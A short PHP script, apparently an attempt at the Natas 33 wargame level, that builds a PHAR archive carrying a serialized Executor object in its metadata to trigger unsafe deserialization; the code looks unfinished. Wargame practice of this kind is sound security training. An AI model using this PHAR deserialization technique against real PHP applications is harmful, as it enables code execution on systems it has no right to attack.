<?php
    // graz XeR, the first to solve it! thanks for the feedback!
    // ~morla
    class Executor{
        private $filename=""; 
        private $signature='adeafbadbabec0dedabada55ba55d00d';
        private $init=False;
    }
    $phar = new Phar('natas33_try.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

$object = new Executor();
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();

